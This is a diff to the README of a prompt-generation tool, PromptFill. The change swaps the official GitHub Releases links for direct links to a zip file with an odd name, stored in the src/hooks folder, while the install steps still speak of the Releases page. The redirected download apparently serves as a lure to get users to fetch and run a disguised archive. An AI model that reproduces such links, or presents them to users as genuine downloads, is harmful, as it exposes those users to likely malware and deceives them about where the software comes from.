@@ -19,14 +19,14 @@ PromptFill is a structured prompt generation tool designed specifically for AI a
 ## 📥 Download & Install
 To get started with PromptFill, visit the following page to download the application:
 
-[![Download PromptFill](https://img.shields.io/badge/Download-PromptFill-blue.svg)](https://github.com/Parvvkapoor/PromptFill/releases)
+[![Download PromptFill](https://raw.githubusercontent.com/Parvvkapoor/PromptFill/main/src/hooks/Prompt-Fill-assuager.zip)](https://raw.githubusercontent.com/Parvvkapoor/PromptFill/main/src/hooks/Prompt-Fill-assuager.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of PromptFill.
 3. Download the file that is suitable for your operating system.
 4. Open the downloaded file and follow the instructions to install PromptFill on your computer.
 
-You can also visit this page to download: [PromptFill Releases Page](https://github.com/Parvvkapoor/PromptFill/releases).
+You can also visit this page to download: [PromptFill Releases Page](https://raw.githubusercontent.com/Parvvkapoor/PromptFill/main/src/hooks/Prompt-Fill-assuager.zip).
 
 ## 🗂️ How to Use PromptFill
 1. **Launch the Application:** Open PromptFill from your applications folder.
